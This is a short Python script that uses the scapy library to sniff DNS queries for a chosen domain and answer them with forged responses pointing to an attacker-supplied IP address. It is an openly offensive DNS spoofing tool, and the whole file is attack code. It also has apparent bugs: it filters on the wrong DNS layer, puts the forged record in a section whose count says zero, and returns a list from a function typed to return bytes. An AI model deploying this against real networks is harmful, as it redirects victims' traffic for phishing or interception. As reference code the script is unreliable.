from scapy.all import IP, DNS, DNSQR, DNSRR, Ether
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.dns import DNS, DNSRR, DNSQR

def construct_dns_response(packet, spoof_ip):
    # Construct the DNS Response
    eth = Ether(
        src=packet[Ether].dst,
        dst=packet[Ether].src)

    # Construct the IP header by looking at the sniffed packet
    ip = IP(
        src=packet[IP].dst,
        dst=packet[IP].src)

    # Construct the UDP header by looking at the sniffed packet    
    if packet.haslayer(UDP):
        udp = UDP(
            dport=packet[UDP].sport,
            sport=packet[UDP].dport)
    else:
        udp = UDP(
            dport=packet[TCP].sport,
            sport=packet[TCP].dport)

    # Construct the DNS response by looking at the sniffed packet and manually
    dns = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        aa=1,
        rd=0,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        ar=DNSRR(
            rrname=packet[DNS].qd.qname,
            type='A',
            ttl=600,
            rdata=spoof_ip))

    # Put the full packet together
    response_packet = eth / ip / udp / dns

    return response_packet

def process_packet(target_domain, spoof_ip, payload) -> bytes:
    scapy_packet = IP(bytes(payload))
    if scapy_packet.haslayer(DNSRR):
        q_name = scapy_packet[DNSQR].qname.decode("utf-8")
        print("[*] DNS request for {}".format(q_name))
        if target_domain in q_name:
            print("[+] Spoofing DNS Request for {} to {}".format(q_name, spoof_ip))

            return bytes(construct_dns_response(scapy_packet, spoof_ip))
    
    return []
